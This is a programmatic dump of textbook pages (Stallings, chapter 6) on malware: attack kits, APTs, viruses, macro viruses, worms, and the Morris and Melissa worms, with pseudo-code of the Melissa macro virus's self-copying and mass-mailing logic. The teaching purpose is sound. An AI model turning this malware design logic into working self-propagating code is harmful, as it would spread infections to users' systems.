       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 210, 'page_label': '209'}, page_content='6.2 / ADVANCED PERSiSTENT THREAT  209\\nThey can also easily be customized with the latest discovered vulnerabilities in order \\nto exploit the window of opportunity between the publication of a weakness and \\nthe widespread deployment of patches to close it. These kits greatly enlarged the \\npopulation of attackers able to deploy malware. Although the malware created with \\nsuch toolkits tends to be less sophisticated than that designed from scratch, the sheer \\nnumber of new variants that can be generated by attackers using these toolkits \\n creates a significant problem for those defending systems against them.\\nThe Zeus crimeware toolkit is a prominent example of such an attack kit, which was \\nused to generate a wide range of very effective, stealthed malware that facilitates a range \\nof criminal activities, in particular capturing and exploiting banking credentials [BINS10]. \\nThe Angler exploit kit, first seen in 2013, was the most active kit seen in 2015, often \\ndistributed via malvertising that exploited Flash vulnerabilities. It is sophisticated and \\ntechnically advanced, in both attacks executed and counter-measures deployed to resist \\ndetection. There are a number of other attack kits in active use, though the specific kits \\nchange from year to year as attackers continue to evolve and improve them [SYMA16].\\nAttack Sources\\nAnother significant malware development over the last couple of decades is the \\nchange from attackers being individuals, often motivated to demonstrate their techni-\\ncal competence to their peers, to more organized and dangerous attack sources. These \\ninclude politically motivated attackers, criminals, and organized crime; organizations \\nthat sell their services to companies and nations, and national government agencies, \\nas we will discuss in Section 8.1. This has significantly changed the resources available \\nand motivation behind the rise of malware, and indeed has led to the development of \\na large underground economy involving the sale of attack kits, access to compromised \\nhosts, and to stolen information.\\n 6.2 ADVANCED PERSISTENT THREAT\\nAdvanced Persistent Threats (APTs) have risen to prominence in recent years. These \\nare not a new type of malware, but rather the well-resourced, persistent application of \\na wide variety of intrusion technologies and malware to selected targets, usually busi-\\nness or political. APTs are typically attributed to state-sponsored organizations, with \\nsome attacks likely from criminal enterprises as well. We will discuss these  categories \\nof intruders further in Section 8.1.\\nAPTs differ from other types of attack by their careful target selection, and \\n persistent, often stealthy , intrusion efforts over extended periods. A number of \\nhigh-profile attacks, including Aurora, RSA, APT1, and Stuxnet, are often cited as \\n examples. They are named as a result of these characteristics:\\n• Advanced: Use by the attackers of a wide variety of intrusion technologies \\nand malware, including the development of custom malware if required. The \\nindividual components may not necessarily be technically advanced, but are \\ncarefully selected to suit the chosen target.\\n• Persistent: Determined application of the attacks over an extended period against \\nthe chosen target in order to maximize the chance of success. A variety of attacks \\nmay be progressively, and often stealthily, applied until the target is compromised.\\nM06_STAL0611_04_GE_C06.indd   209 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 211, 'page_label': '210'}, page_content='210  CHAPTER 6 / MAliCiouS SofTwARE\\n• Threats: Threats to the selected targets as a result of the organized, capable, and \\nwell-funded attackers intent to compromise the specifically chosen targets. The \\nactive involvement of people in the process greatly raises the threat level from \\nthat due to automated attacks tools, and also the likelihood of successful attack.\\nThe aim of these attacks varies from theft of intellectual property or security- \\nand infrastructure- related data to the physical disruption of infrastructure.  Techniques \\nused include social engineering, spear-phishing e-mails, and  drive- by-downloads \\nfrom selected compromised Web sites likely to be visited by personnel in the target \\n organization. The intent is to infect the target with sophisticated malware with mul-\\ntiple propagation mechanisms and payloads. Once they have gained initial access to \\nsystems in the target organization, a further range of attack tools are used to maintain \\nand extend their access.\\nAs a result, these attacks are much harder to defend against due to this specific \\ntargeting and persistence. It requires a combination of technical countermeasures, \\nsuch as we will discuss later in this chapter, as well as awareness training to assist per-\\nsonnel to resist such attacks, as we will discuss in Chapter 17 . Even with current best-\\npractice countermeasures, the use of zero-day exploits and new attack approaches \\nmeans that some of these attacks are likely to succeed [SYMA16, MAND13]. Thus \\nmultiple layers of defense are needed, with mechanisms to detect, respond, and miti-\\ngate such attacks. These may include monitoring for malware command and control \\ntraffic, and detection of exfiltration traffic.\\n 6.3 PROPAGATION—INFECTED CONTENT—VIRUSES\\nThe first category of malware propagation concerns parasitic software fragments that \\nattach themselves to some existing executable content. The fragment may be machine \\ncode that infects some existing application, utility, or system program, or even the \\ncode used to boot a computer system. Computer virus infections formed the major-\\nity of malware seen in the early personal computer era. The term “computer virus” \\nis still often used to refer to malware in general, rather than just computer viruses \\nspecifically. More recently, the virus software fragment has been some form of script-\\ning code, typically used to support active content within data files such as Microsoft \\nWord documents, Excel spreadsheets, or Adobe PDF documents.\\nThe Nature of Viruses\\nA computer virus is a piece of software that can “infect” other programs, or indeed any \\ntype of executable content, by modifying them. The modification includes injecting \\nthe original code with a routine to make copies of the virus code, which can then go \\non to infect other content. Computer viruses first appeared in the early 1980s, and the \\nterm itself is attributed to Fred Cohen. Cohen is the author of a groundbreaking book \\non the subject [COHE94]. The Brain virus, first seen in 1986, was one of the first to \\ntarget MSDOS systems, and resulted in a significant number of infections for this time.\\nBiological viruses are tiny scraps of genetic code—DNA or RNA—that can take \\nover the machinery of a living cell and trick it into making thousands of flawless rep-\\nlicas of the original virus. Like its biological counterpart, a computer virus carries in \\nM06_STAL0611_04_GE_C06.indd   210 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 212, 'page_label': '211'}, page_content='6.3 / PRoPAGATioN—iNfECTED CoNTENT—ViRuSES  211\\nits instructional code the recipe for making perfect copies of itself. The typical virus \\nbecomes embedded in a program, or carrier of executable content, on a computer. Then, \\nwhenever the infected computer comes into contact with an uninfected piece of code, a \\nfresh copy of the virus passes into the new location. Thus, the infection can spread from \\ncomputer to computer, aided by unsuspecting users, who exchange these programs or \\ncarrier files on disk or USB stick; or who send them to one another over a network. \\nIn a network environment, the ability to access documents, applications, and system \\nservices on other computers provides a perfect culture for the spread of such viral code.\\nA virus that attaches to an executable program can do anything that the pro -\\ngram is permitted to do. It executes secretly when the host program is run. Once \\nthe virus code is executing, it can perform any function, such as erasing files and \\nprograms, that is allowed by the privileges of the current user. One reason viruses \\ndominated the malware scene in earlier years was the lack of user authentication \\nand access controls on personal computer systems at that time. This enabled a virus \\nto infect any executable content on the system. The significant quantity of programs \\nshared on floppy disk also enabled its easy, if somewhat slow, spread. The inclusion \\nof tighter access controls on modern operating systems significantly hinders the ease \\nof infection of such traditional, machine executable code, viruses. This resulted in \\nthe development of macro viruses that exploit the active content supported by some \\ndocuments types, such as Microsoft Word or Excel files, or Adobe PDF documents. \\nSuch documents are easily modified and shared by users as part of their normal sys-\\ntem use, and are not protected by the same access controls as programs. Currently, \\na viral mode of infection is typically one of several propagation mechanisms used \\nby contemporary malware, which may also include worm and Trojan capabilities.\\n[A YCO06] states that a computer virus has three parts. More generally, many \\ncontemporary types of malware also include one or more variants of each of these \\ncomponents:\\n• Infection mechanism:  The means by which a virus spreads or propagates, \\nenabling it to replicate. The mechanism is also referred to as the infection vector.\\n• Trigger: The event or condition that determines when the payload is activated \\nor delivered, sometimes known as a logic bomb.\\n• Payload: What the virus does, besides spreading. The payload may involve dam-\\nage or may involve benign but noticeable activity.\\nDuring its lifetime, a typical virus goes through the following four phases:\\n• Dormant phase: The virus is idle. The virus will eventually be activated by some \\nevent, such as a date, the presence of another program or file, or the capacity of \\nthe disk exceeding some limit. Not all viruses have this stage.\\n• Propagation phase: The virus places a copy of itself into other programs or into \\ncertain system areas on the disk. The copy may not be identical to the propagat-\\ning version; viruses often morph to evade detection. Each infected program will \\nnow contain a clone of the virus, which will itself enter a propagation phase.\\n• Triggering phase: The virus is activated to perform the function for which it was \\nintended. As with the dormant phase, the triggering phase can be caused by a \\nvariety of system events, including a count of the number of times that this copy \\nof the virus has made copies of itself.\\nM06_STAL0611_04_GE_C06.indd   211 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 213, 'page_label': '212'}, page_content='212  CHAPTER 6 / MAliCiouS SofTwARE\\n• Execution phase:  The function is performed. The function may be harmless, \\nsuch as a message on the scr een, or damaging, such as the destruction of pro -\\ngrams and data files.\\nMost viruses that infect executable program files carry out their work in a \\nmanner that is specific to a particular operating system and, in some cases, specific \\nto a particular hardware platform. Thus, they are designed to take advantage of the \\ndetails and weaknesses of particular systems. Macro viruses however target specific \\ndocument types, which are often supported on a variety of systems.\\nOnce a virus has gained entry to a system by infecting a single program, it is in a \\nposition to potentially infect some or all of the other files on that system with execut-\\nable content when the infected program executes, depending on the access permis -\\nsions the infected program has. Thus, viral infection can be completely prevented by \\nblocking the virus from gaining entry in the first place. Unfortunately, prevention is \\nextraordinarily difficult because a virus can be part of any program outside a system. \\nThus, unless one is content to take an absolutely bare piece of iron and write all one’s \\nown system and application programs, one is vulnerable. Many forms of infection can \\nalso be blocked by denying normal users the right to modify programs on the system.\\nMacro and Scripting Viruses\\nIn the mid-1990s, macro or scripting code viruses became by far the most prevalent \\ntype of virus. NISTIR 7298 (Glossary of Key Information Security Terms, May 2013) \\ndefines a macro virus as a virus that attaches itself to documents and uses the macro \\nprogramming capabilities of the document’s application to execute and propagate. \\nMacro viruses infect scripting code used to support active content in a variety of user \\ndocument types. Macro viruses are particularly threatening for a number of reasons:\\n1. A macro virus is platform independent. Many macro viruses infect active con-\\ntent in commonly used applications, such as macros in Microsoft Word docu -\\nments or other Microsoft Office documents, or scripting code in Adobe PDF \\ndocuments. Any hardware platform and operating system that supports these \\napplications can be infected.\\n2. Macro viruses infect documents, not executable portions of code. Most of the \\ninformation introduced onto a computer system is in the form of documents rather \\nthan programs.\\n3. Macro viruses are easily spread, as the documents they exploit are shared in nor-\\nmal use. A very common method is by electronic mail, particularly since these \\ndocuments can sometimes be opened automatically without prompting the user.\\n4. Because macro viruses infect user documents rather than system programs, tra-\\nditional file system access controls are of limited use in preventing their spread, \\nsince users are expected to modify them.\\n5. Macro viruses are much easier to write or to modify than traditional execut -\\nable viruses.\\nMacro viruses take advantage of support for active content using a scripting or macro \\nlanguage, embedded in a word processing document or other type of file. Typically, \\nusers employ macros to automate repetitive tasks and thereby save keystrokes. They \\nM06_STAL0611_04_GE_C06.indd   212 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 214, 'page_label': '213'}, page_content='6.3 / PRoPAGATioN—iNfECTED CoNTENT—ViRuSES  213\\nare also used to support dynamic content, form validation, and other useful tasks \\nassociated with these documents.\\nMicrosoft Word and Excel documents are common targets due to their wide -\\nspread use. Successive releases of MS Office products provide increased protection \\nagainst macro viruses. For example, Microsoft offers an optional Macro Virus Protec-\\ntion tool that detects suspicious Word files and alerts the customer to the potential \\nrisk of opening a file with macros. Office 2000 improved macro security by allowing \\nmacros to be digitally signed by their author, and for authors to be listed as trusted. \\nUsers were then warned if a document being opened contained unsigned, or signed \\nbut untrusted, macros, and were advised to disable macros in this case. Various anti-\\nvirus product vendors have also developed tools to detect and remove macro viruses. \\nAs in other types of malware, the arms race continues in the field of macro viruses, \\nbut they no longer are the predominant malware threat.\\nAnother possible host for macro virus–style malware is in Adobe’s PDF docu-\\nments. These can support a range of embedded components, including Javascript \\nand other types of scripting code. Although recent PDF viewers include measures to \\nwarn users when such code is run, the message the user is shown can be manipulated \\nto trick them into permitting its execution. If this occurs, the code could potentially \\nact as a virus to infect other PDF documents the user can access on their system. \\n Alternatively, it can install a Trojan, or act as a worm, as we will discuss later [STEV11].\\nMacro Virus structure Although macro languages may have a similar syntax, \\nthe details depend on the application interpreting the macro, and so will always target \\ndocuments for a specific application. For example, a Microsoft Word macro, including \\na macro virus, will be different to an Excel macro. Macros can either be saved with \\na document, or be saved in a global template or worksheet. Some macros are run \\nautomatically when certain actions occur. In Microsoft Word, for example, macros \\ncan run when Word starts, a document is opened, a new document is created, or when \\na document is closed. Macros can perform a wide range of operations, not just only \\non the document content, but can read and write files, and call other applications.\\nAs an example of the operation of a macro virus, pseudo-code for the Melissa \\nmacro virus is shown in Figure 6.1. This was a component of the Melissa e-mail worm \\nthat we will describe further in the next section. This code would be introduced onto a \\nsystem by opening an infected Word document, most likely sent by e-mail. This macro \\ncode is contained in the Document_Open macro, which is automatically run when \\nthe document is opened. It first disables the Macro menu and some related security \\nfeatures, making it harder for the user stop or remove its operation. Next it checks to \\nsee if it is being run from an infected document, and if so copies itself into the global \\ntemplate file. This file is opened with every subsequent document, and the macro virus \\nrun, infecting that document. It then checks to see if it has been run on this system \\nbefore, by looking to see if a specific key “Melissa” has been added to the registry. If \\nthat key is absent, and Outlook is the e-mail client, the macro virus then sends a copy \\nof the current, infected document to each of the first 50 addresses in the current user’s \\nAddress Book. It then creates the “Melissa” registry entry, so this is only done once on \\nany system. Finally it checks the current time and date for a specific trigger condition, \\nwhich if met results in a Simpson quote being inserted into the current document. \\nOnce the macro virus code has finished, the document continues opening and the user \\nM06_STAL0611_04_GE_C06.indd   213 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 215, 'page_label': '214'}, page_content='214  CHAPTER 6 / MAliCiouS SofTwARE\\ncan then edit as normal. This code illustrates how a macro virus can manipulate both \\nthe document contents, and access other applications on the system. It also shows two \\ninfection mechanisms, the first infecting every subsequent document opened on the \\nsystem, the second sending infected documents to other users via e-mail.\\nMore sophisticated macro virus code can use stealth techniques such as encryp-\\ntion or polymorphism, changing its appearance each time, to avoid scanning detection.\\nViruses Classification\\nThere has been a continuous arms race between virus writers and writers of anti-virus \\nsoftware since viruses first appeared. As effective countermeasures are developed for \\nexisting types of viruses, newer types are developed. There is no simple or universally \\nagreed- upon classification scheme for viruses. In this section, we follow [A YCO06] \\nand classify viruses along two orthogonal axes: the type of target the virus tries to \\ninfect, and the method the virus uses to conceal itself from detection by users and \\nanti-virus software.\\nA virus classification by target includes the following categories:\\n• Boot sector infector: Infects a master boot record or boot record and spreads \\nwhen a system is booted from the disk containing the virus.\\n• File infector : Infects files that the operating system or shell consider to be \\nexecutable.\\nmacro Document_Open\\n    disable Macro menu and some macro security features\\n    if called from a user document\\n       copy macro code into Normal template file\\n    else\\n       copy macro code into user document being opened\\n    end if\\n    if registry key “Melissa” not present\\n       if Outlook is email client\\n          for first 50 addresses in address book\\n              send email to that address\\n              with currently infected document attached\\n          end for\\n       end if\\n       create registry key “Melissa”\\n    end if\\n    if minute in hour equals day of month\\n       insert text into document being opened\\n    end if\\nend macro\\nFigure 6.1 Melissa Macro Virus Pseudo-code\\nM06_STAL0611_04_GE_C06.indd   214 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 216, 'page_label': '215'}, page_content='6.4 / PRoPAGATioN—VulNERABiliTY EXPloiT—woRMS  215\\n• Macro virus: Infects files with macro or scripting code that is interpreted by an \\napplication.\\n• Multipartite virus: Infects files in multiple ways. Typically, the multipartite virus \\nis capable of infecting multiple types of files, so virus eradication must deal with \\nall of the possible sites of infection.\\nA virus classification by concealment strategy includes the following categories:\\n• Encrypted virus: A form of virus that uses encryption to obscure it’s content. \\nA\\xa0portion of the virus creates a random encryption key and encrypts the remain-\\nder of the virus. The key is stored with the virus. When an infected program is \\ninvoked, the virus uses the stored random key to decrypt the virus. When the \\nvirus replicates, a different random key is selected. Because the bulk of the \\nvirus is encrypted with a different key for each instance, there is no constant \\nbit pattern to observe.\\n• Stealth virus: A form of virus explicitly designed to hide itself from detection by \\nanti-virus software. Thus, the entire virus, not just a payload, is hidden. It may \\nuse code mutation, compression, or rootkit techniques to achieve this.\\n• Polymorphic virus: A form of virus that creates copies during replication that \\nare functionally equivalent but have distinctly different bit patterns, in order to \\ndefeat programs that scan for viruses. In this case, the “signature” of the virus \\nwill vary with each copy. To achieve this variation, the virus may randomly insert \\nsuperfluous instructions or interchange the order of independent instructions. \\nA more effective approach is to use encryption. The strategy of the encryption \\nvirus is followed. The portion of the virus that is responsible for generating keys \\nand performing encryption/decryption is referred to as the mutation engine. The \\nmutation engine itself is altered with each use.\\n• Metamorphic virus: As with a polymorphic virus, a metamorphic virus mutates \\nwith every infection. The difference is that a metamorphic virus rewrites itself \\ncompletely at each iteration, using multiple transformation techniques, increas-\\ning the difficulty of detection. Metamorphic viruses may change their behavior \\nas well as their appearance.\\n 6.4 PROPAGATION—VULNERABILITY EXPLOIT—WORMS\\nThe next category of malware propagation concerns the exploit of software vulner-\\nabilities, such as those we will discuss in Chapters 10 and 11, which are commonly \\nexploited by computer worms, and in hacking attacks on systems. A worm is a pro -\\ngram that actively seeks out more machines to infect, and then each infected machine \\nserves as an automated launching pad for attacks on other machines. Worm programs \\nexploit software vulnerabilities in client or server programs to gain access to each new \\nsystem. They can use network connections to spread from system to system. They can \\nalso spread through shared media, such as USB drives or CD and DVD data disks. \\nE-mail worms can spread in macro or script code included in documents attached to \\nM06_STAL0611_04_GE_C06.indd   215 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 217, 'page_label': '216'}, page_content='216  CHAPTER 6 / MAliCiouS SofTwARE\\ne-mail or to instant messenger file transfers. Upon activation, the worm may replicate \\nand propagate again. In addition to propagation, the worm usually carries some form \\nof payload, such as those we discuss later.\\nThe concept of a computer worm was introduced in John Brunner’s 1975 SF \\nnovel The Shockwave Rider . The first known worm implementation was done in \\nXerox Palo Alto Labs in the early 1980s. It was nonmalicious, searching for idle sys-\\ntems to use to run a computationally intensive task.\\nTo replicate itself, a worm uses some means to access remote systems. These \\ninclude the following, most of which are still seen in active use:\\n• Electronic mail or instant messenger facility: A worm e-mails a copy of itself to \\nother systems, or sends itself as an attachment via an instant message service, so \\nthat its code is run when the e-mail or attachment is received or viewed.\\n• File sharing: A worm either creates a copy of itself or infects other suitable files \\nas a virus on removable media such as a USB drive; it then executes when the \\ndrive is connected to another system using the autorun mechanism by exploit-\\ning some software vulnerability, or when a user opens the infected file on the \\ntarget system.\\n• Remote execution capability:  A worm executes a copy of itself on another \\nsystem, either by using an explicit remote execution facility or by exploiting a \\nprogram flaw in a network service to subvert its operations (as we will discuss \\nin Chapters 10 and 11).\\n• Remote file access or transfer capability: A worm uses a remote file access or \\ntransfer service to another system to copy itself from one system to the other, \\nwhere users on that system may then execute it.\\n• Remote login capability: A worm logs onto a remote system as a user and then \\nuses commands to copy itself from one system to the other, where it then executes.\\nThe new copy of the worm program is then run on the remote system where, in \\naddition to any payload functions that it performs on that system, it continues to \\npropagate.\\nA worm typically uses the same phases as a computer virus: dormant, prop -\\nagation, triggering, and execution. The propagation phase generally performs the \\n following functions:\\n• Search for appropriate access mechanisms on other systems to infect by exam-\\nining host tables, address books, buddy lists, trusted peers, and other similar \\nrepositories of remote system access details; by scanning possible target host \\naddresses; or by searching for suitable removable media devices to use.\\n• Use the access mechanisms found to transfer a copy of itself to the remote \\nsystem, and cause the copy to be run.\\nThe worm may also attempt to determine whether a system has previously been \\ninfected before copying itself to the system. In a multiprogramming system, it can also \\ndisguise its presence by naming itself as a system process or using some other name \\nthat may not be noticed by a system operator. More recent worms can even inject \\ntheir code into existing processes on the system, and run using additional threads in \\nthat process, to further disguise their presence.\\nM06_STAL0611_04_GE_C06.indd   216 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 218, 'page_label': '217'}, page_content='6.4 / PRoPAGATioN—VulNERABiliTY EXPloiT—woRMS  217\\nTarget Discovery\\nThe first function in the propagation phase for a network worm is for it to search for \\nother systems to infect, a process known as scanning or fingerprinting. For such worms, \\nwhich exploit software vulnerabilities in remotely accessible network services, it must \\nidentify potential systems running the vulnerable service, and then infect them. Then, \\ntypically, the worm code now installed on the infected machines repeats the same \\nscanning process, until a large distributed network of infected machines is created.\\n[MIRK04] lists the following types of network address scanning strategies that \\nsuch a worm can use:\\n• Random: Each compromised host probes random addresses in the IP address \\nspace, using a different seed. This technique produces a high volume of Internet \\ntraffic, which may cause generalized disruption even before the actual attack \\nis launched.\\n• Hit-List: The attacker first compiles a long list of potential vulnerable machines. \\nThis can be a slow process done over a long period to avoid detection that \\nan attack is underway. Once the list is compiled, the attacker begins infecting \\nmachines on the list. Each infected machine is provided with a portion of the list \\nto scan. This strategy results in a very short scanning period, which may make \\nit difficult to detect that infection is taking place.\\n• Topological: This method uses information contained on an infected victim \\nmachine to find more hosts to scan.\\n• Local subnet: If a host can be infected behind a firewall, that host then looks \\nfor targets in its own local network. The host uses the subnet address structure \\nto find other hosts that would otherwise be protected by the firewall.\\nWorm Propagation Model\\nA well-designed worm can spread rapidly and infect massive numbers of hosts. It is \\nuseful to have a general model for the rate of worm propagation. Computer viruses \\nand worms exhibit similar self-replication and propagation behavior to biological \\nviruses. Thus we can look to classic epidemic models for understanding computer \\nvirus and worm propagation behavior. A simplified, classic epidemic model can be \\nexpressed as follows:\\ndI(t)\\ndt = bI(t) S (t)\\nwhere\\n I(t) = number of individuals infected as of time t\\n S(t) = number of susceptible individuals (susceptible to infection but not yet \\ninfected) at time t\\n b = infection rate\\n N = size of the population, N = I(t) + S(t)\\nFigure 6.2 shows the dynamics of worm propagation using this model. Propaga-\\ntion proceeds through three phases. In the initial phase, the number of hosts increases \\nM06_STAL0611_04_GE_C06.indd   217 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 219, 'page_label': '218'}, page_content='218  CHAPTER 6 / MAliCiouS SofTwARE\\nexponentially. To see that this is so, consider a simplified case in which a worm is \\nlaunched from a single host and infects two nearby hosts. Each of these hosts infects \\ntwo more hosts, and so on. This results in exponential growth. After a time, infecting \\nhosts waste some time attacking already infected hosts, which reduces the rate of \\ninfection. During this middle phase, growth is approximately linear, but the rate of \\ninfection is rapid. When most vulnerable computers have been infected, the attack \\nenters a slow finish phase as the worm seeks out those remaining hosts that are dif -\\nficult to identify.\\nClearly, the objective in countering a worm is to catch the worm in its slow start \\nphase, at a time when few hosts have been infected.\\nZou et al. [ZOU05] describe a model for worm propagation based on an analy-\\nsis of network worm attacks at that time. The speed of propagation and the total \\nnumber of hosts infected depend on a number of factors, including the mode of \\npropagation, the vulnerability or vulnerabilities exploited, and the degree of similar-\\nity to preceding attacks. For the latter factor, an attack that is a variation of a recent \\nprevious attack may be countered more effectively than a more novel attack. Zou’s \\nmodel agrees closely with Figure 6.2.\\nThe Morris Worm\\nArguably, the earliest significant, and hence well-known, worm infection was released \\nonto the Internet by Robert Morris in 1988 [ORMA03]. The Morris worm was \\ndesigned to spread on UNIX systems and used a number of different techniques for \\npropagation. When a copy began execution, its first task was to discover other hosts \\nknown to this host that would allow entry from this host. The worm performed this \\ntask by examining a variety of lists and tables, including system tables that declared \\nwhich other machines were trusted by this host, users’ mail forwarding files, tables \\nFigure 6.2 Worm Propagation Model\\n0.2\\n0\\nSlow start phase\\nFraction of\\nhosts infected\\nFraction of\\nhosts not\\ninfected\\nTime\\nFraction0.4\\n0.6\\n0.8\\n1.0\\nFast spread sphase Slow ﬁnish phase\\nM06_STAL0611_04_GE_C06.indd   218 10/11/17   2:51 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 220, 'page_label': '219'}, page_content='6.4 / PRoPAGATioN—VulNERABiliTY EXPloiT—woRMS  219\\nby which users gave themselves permission for access to remote accounts, and from \\na program that reported the status of network connections. For each discovered host, \\nthe worm tried a number of methods for gaining access:\\n1. It attempted to log on to a remote host as a legitimate user. In this method, the \\nworm first attempted to crack the local password file then used the discovered \\npasswords and corresponding user IDs. The assumption was that many users \\nwould use the same password on different systems. To obtain the passwords, the \\nworm ran a password-cracking program that tried:\\na. Each user’s account name and simple permutations of it.\\nb. A list of 432 built-in passwords that Morris thought to be likely candidates1.\\nc. All the words in the local system dictionary.\\n2. It exploited a bug in the UNIX finger protocol, which reports the whereabouts of \\na remote user.\\n3. It exploited a trapdoor in the debug option of the remote process that receives \\nand sends mail.\\nIf any of these attacks succeeded, the worm achieved communication with the \\noperating system command interpreter. It then sent this interpreter a short bootstrap \\nprogram, issued a command to execute that program, and then logged off. The boot-\\nstrap program then called back the parent program and downloaded the remainder \\nof the worm. The new worm was then executed.\\nA Brief History of Worm Attacks\\nThe Melissa e-mail worm that appeared in 1998 was the first of a new generation of \\nmalware that included aspects of virus, worm, and Trojan in one package [CASS01]. \\nMelissa made use of a Microsoft Word macro embedded in an attachment, as we \\ndescribed in the previous section. If the recipient opens the e-mail attachment, the \\nWord macro is activated. Then it:\\n1. Sends itself to everyone on the mailing list in the user’s e-mail package, propa-\\ngating as a worm; and\\n2. Does local damage on the user’s system, including disabling some security tools, \\nand also copying itself into other documents, propagating as a virus; and\\n3. If a trigger time was seen, it displayed a Simpson quote as its payload.\\nIn 1999, a more powerful version of this e-mail virus appeared. This version \\ncould be activated merely by opening an e-mail that contains the virus, rather than by \\nopening an attachment. The virus uses the Visual Basic scripting language supported \\nby the e-mail package.\\nMelissa propagates itself as soon as it is activated (either by opening an e-mail \\nattachment or by opening the e-mail) to all of the e-mail addresses known to the \\ninfected host. As a result, whereas viruses used to take months or years to propa -\\ngate, this next generation of malware could do so in hours. [CASS01] notes that it \\n1The complete list is provided at this book’s website.\\nM06_STAL0611_04_GE_C06.indd   219 10/11/17   2:51 PM'),\n",
